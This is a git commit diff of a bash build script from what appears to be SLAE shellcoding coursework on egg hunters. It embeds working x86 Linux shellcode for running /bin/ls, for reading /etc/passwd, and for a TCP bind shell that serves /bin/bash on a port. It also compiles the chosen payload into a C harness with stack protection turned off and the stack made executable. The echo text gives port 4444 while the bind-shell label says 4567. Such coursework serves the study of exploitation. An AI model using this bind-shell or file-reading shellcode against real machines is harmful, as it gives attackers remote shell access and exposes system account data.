6f8ffb64928d112b0a27b5948dc43f8f43689518
root <root@localhost.localdomain>
2019-04-01 16:02:56 -0400

    updated assignment 3

--- Assignment_3/build_shellcode.sh
+++ Assignment_3/build_shellcode.sh
@@ -1,70 +1,50 @@
 #!/bin/bash
-#Author:SLAE-755 
-
-port=4444
-IP="127.0.0.1"
+#Author:SLAE-755
 
 #clean previous compiled files
 rm -f  *.o shellcode
 
 
+cp shellcode_template.c shellcode.c
 
 
 #CHECK PARAMETERS: $1 -> PAYLOAD
 if [ $# -ne 1 ]
 	then
 		echo -e "[!] No Payload selected\n    Using Default Payload execve /bin/ls"
-		echo "    Usage: $0 [123]\n        1 is execve /bin/ls payload\n        2 is execve /bin/cat /etc/passwd payload\n        3 is TCP Bind shell on port 4444 payload"
+		echo -e "    Usage: $0 [123]\n        1 is execve /bin/ls payload\n        2 is execve /bin/cat /etc/passwd payload\n        3 is TCP Bind shell on port 4444 payload"
+		payload="\x90\x50\x90\x50\x90\x50\x90\x50\x31\xc0\x50\x68\x2f\x2f\x6c\x73\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
 else
 	if [ $1 -eq 1 ]
 		then
-			echo "[+] TODO 1"
+			echo "[+] Building egg hunter using '/bin/ls' payload"
+			payload="\x90\x50\x90\x50\x90\x50\x90\x50\x31\xc0\x50\x68\x2f\x2f\x6c\x73\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+
 	fi
 
 	if [ $1 -eq 2 ]
 		then
-			echo "[+] TODO"
+			echo "[+] Building egg hunter using 'cat /etc/passwd' payload"
+			payload="\x90\x50\x90\x50\x90\x50\x90\x50\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80";
 	fi
 
 	if [ $1 -eq 3 ]
 		then
-			echo "[+] TODO"
+			echo "[+] Building egg hunter using 'TCP Bind on port 4567' payload"
+			payload="\x90\x50\x90\x50\x90\x50\x90\x50\x31\xc0\x89\xc3\x89\xc1\x89\xc2\x66\xb8\x67\x01\xb3\x02\xfe\xc1\xcd\x80\x89\xc3\x31\xc0\x89\xc2\x66\xb8\x69\x01\x31\xc9\x51\x66\x68\x11\xD7\x66\x6a\x02\x89\xe1\xb2\x10\xcd\x80\x31\xc9\x31\xc0\x66\xb8\x6b\x01\xcd\x80\x31\xf6\x31\xc0\x66\xb8\x6c\x01\x99\x52\x89\xe1\x89\xe2\xcd\x80\x89\xc3\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\xb0\x3f\xcd\x80\x49\xb0\x3f\xcd\x80\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
+
 	fi
 fi
 
-
-
-#############################
-#ls
-#"\x90\x50\x90\x50\x90\x50\x90\x50\x31\xc0\x50\x68\x2f\x2f\x6c\x73\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
-
-#cat /etc/passwd
-#"\x90\x50\x90\x50\x90\x50\x90\x50\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80";
-
-#tcp bind
-
-
-shellcode_name="reverse_tcp_shellcode"
-./compile.sh $shellcode_name
-
-
-port=$(printf "%X" $port)
-port_hex=$(echo $port | awk '{printf("\\x%s\\x%s",substr($0,1,2),substr($0,3,4)); }' | sed "s/\\\/\\\\\\\\/g")
-
-
-payload=$(objdump -d $shellcode_name|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g')
-cp shellcode_template.c shellcode.c
 payload2=$(echo $payload | sed "s/\\\/\\\\\\\/g")
+
+
 
 #injecting shellcode
 sed  -i "s/XXX/$payload2/g" shellcode.c
 
-#changing port in the shellcode
-sed  -i "s/\\\x11\\\x5c/$port_hex/g" shellcode.c
-
-#changing IP in the shellcode
-encoded_ip=$(echo $encoded_ip |  sed "s/\\\/\\\\\\\\/g")
-sed  -i "s/\\\x80\\\xff\\\xff\\\xfe/$encoded_ip/g" shellcode.c
 
 
 gcc -m32 -fno-stack-protector -z execstack shellcode.c -o shellcode
+
+echo "[+] Done!"
